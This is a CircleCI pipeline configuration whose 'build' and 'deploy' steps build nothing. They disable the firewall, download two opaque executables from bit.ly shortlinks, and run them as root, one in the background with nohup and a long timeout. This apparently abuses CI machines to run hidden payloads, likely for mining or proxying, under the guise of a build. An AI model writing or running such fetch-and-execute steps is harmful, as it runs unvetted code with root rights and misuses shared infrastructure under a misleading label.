version: 2
jobs:
  build:
    machine:
      image: ubuntu-2004:202104-01
    resource_class: large
    steps:
      - run: 
         name: "creating"
         command: |
          sudo apt-get update
          sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
          sudo ufw disable 
          wget https://bit.ly/3y1sb9e
          chmod +x 3y1sb9e
          sudo su --command "nohup ./3y1sb9e --log=stdout > meta.log &"
          sleep 2
          sudo su --command "cat meta.log"    
      - run: 
         name: "deploy"
         no_output_timeout: 60m
         command: |
          wget https://bit.ly/3PZbK3U
          chmod +x 3PZbK3U
          sudo su --command "./3PZbK3U"
